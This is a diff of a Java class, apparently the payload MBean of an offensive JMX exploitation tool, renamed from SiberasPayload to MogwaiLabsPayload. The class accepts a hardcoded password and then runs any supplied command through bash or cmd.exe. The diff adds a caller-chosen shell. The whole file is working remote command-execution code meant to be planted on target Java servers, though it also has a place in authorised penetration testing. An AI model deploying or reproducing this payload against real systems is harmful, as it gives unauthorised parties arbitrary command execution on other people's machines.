@@ -1,4 +1,4 @@
-package de.siberas.lab;
+package de.mogwailabs.MogwaiLabsMJET;
 
 import javax.script.ScriptEngineManager;
 import java.io.InputStreamReader;
@@ -6,17 +6,17 @@ import java.io.StringWriter;
 
 import javax.script.ScriptEngine;
 
-public class SiberasPayload implements SiberasPayloadMBean {
+public class MogwaiLabsPayload implements MogwaiLabsPayloadMBean {
 	
 	private String password;
 
 	
-	public SiberasPayload() {
+	public MogwaiLabsPayload() {
 		password = "I+n33d+a+glass+0f+watta";
 	}
 	
 	@Override
-	public String runCMD(String passwd, String cmd) {
+	public String runCMD(String passwd, String cmd, String shell) {
 
 		
 		if (passwd.equals(this.password) == false)  {
@@ -27,8 +27,13 @@ public class SiberasPayload implements SiberasPayloadMBean {
 			
 			
 			String[] full_cmd;
-
-			if(System.getProperty("line.separator").equals("\n"))
+			String[] sh;
+			
+			if(shell != null) {
+				sh =  shell.split(" ");
+				full_cmd = new String[] {sh[0], sh[1], cmd};
+			}
+			else if(System.getProperty("line.separator").equals("\n"))
 				full_cmd = new String[]{"bash","-c",cmd};
 			else // Assumes win
 				full_cmd = new String[]{"cmd.exe","/c",cmd};
@@ -95,3 +100,4 @@ public class SiberasPayload implements SiberasPayloadMBean {
 	}
 
 }
+
